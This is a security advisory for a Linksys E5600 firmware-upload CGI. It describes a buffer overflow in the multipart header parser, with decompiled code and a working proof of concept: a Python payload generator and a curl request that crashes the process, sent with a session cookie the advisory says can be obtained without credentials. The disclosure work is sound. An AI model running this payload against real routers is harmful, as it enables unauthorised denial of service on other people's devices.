# CVE-TBD: Linksys E5600 upload_fw.cgi Multipart Header Parser Buffer Overflow (Crash Verified)

## Affected Product

- Vendor: Linksys
- Product: E5600
- Firmware: v1.1.0.26
- Component: `/www/cgi-bin/upload_fw.cgi` (MIPS32 ELF binary, firmware upload handler)

## Summary

The multipart/form-data header parser of `/cgi-bin/upload_fw.cgi`
(`init_multipart`) appends attacker-controlled header lines into a
**1024-byte global buffer using unbounded `strcat()`**. Each crafted header
block contributes up to ~1533 bytes and the parsing loop can be re-entered
arbitrarily many times, so the overflow length is attacker-controlled.
The overflow was **dynamically verified to crash the CGI process**
(HTTP 500). Combined with the pre-authentication session-issuance flaws
in al.cgi / mesh_login.cgi, the vulnerable endpoint is reachable without
credentials.

## Vulnerability Type / CWE

- CWE-787: Out-of-bounds Write (CWE-120)

## Root Cause

Decompiled logic of `init_multipart`:

```c
memset(global_hdr_buf, 0, 0x400);              // 1024-byte global buffer
while (true) {
    fgets(line, 0x200, stdin);                 // up to 511 bytes per line
    if (strstr(line, "filename=")) break;      // file part begins
    if (strstr(line, "Content-Disposition")) {
        strcat(global_hdr_buf, line);          // no remaining-space check
        fgets(line, 0x200, stdin);
        strcat(global_hdr_buf, line);          // + up to 511 bytes
        fgets(line, 0x200, stdin);
        strcat(global_hdr_buf, line);          // + up to 511 bytes
    }
}
```

A `Content-Disposition` line that does NOT contain `filename=` (e.g. a
padded form-field part) triggers the triple `strcat`: up to ~1533 bytes
appended per block into the 1024-byte buffer, and the loop continues
reading further parts.

## Proof of Concept (non-destructive)

```bash
python3 - <<'PY'
boundary = '----TEST9999'
parts = []
for i in range(3):  # three crafted header blocks -> ~3.4 KB overflow
    parts.append(f'--{boundary}\r\n'
                 f'Content-Disposition: form-data; name="{"B"*480}"\r\n'
                 f'{"C"*490}\r\n'
                 f'{"D"*490}\r\n')
parts.append(f'--{boundary}\r\n'
             f'Content-Disposition: form-data; name="file"; filename="fw.img"\r\n'
             f'Content-Type: application/octet-stream\r\n\r\n'
             f'FAKEFWDATA\r\n--{boundary}--\r\n')
open('ovf.bin', 'w').write(''.join(parts))
PY

# session cookie obtainable without credentials via the al.cgi flaw
curl -X POST http://<ROUTER_IP>/cgi-bin/upload_fw.cgi \
  -b "HSESSIONID=<id>" \
  -H "Content-Type: multipart/form-data; boundary=----TEST9999" \
  --data-binary @ovf.bin
```

Observed result (reproducible): **HTTP 500** — the CGI process dies
mid-request (memory corruption); lighttpd itself remains alive. A smaller
single-block overflow (~470 bytes past the buffer) completes normally and
the upload succeeds, confirming the vulnerable code path executes.

## Impact

- Repeatable denial of service against the firmware-upload endpoint via
  memory corruption.
- Out-of-bounds write of attacker-controlled data with attacker-controlled
  length; further exploitation (code execution) depends on `.bss`
  adjacency and was not pursued.

## Proposed CVSS 3.1

`AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` — **6.5 (Medium)**

## Discovery

- Date: 2026-10-10
- Method: static reverse engineering (Ghidra) + dynamic crash reproduction on rehosted firmware
- Researcher: Zimo-666

## Timeline

- 2026-10-10: Vulnerability discovered and verified
- TBD: Vendor notification
- TBD: CVE ID assignment
- TBD: Public disclosure
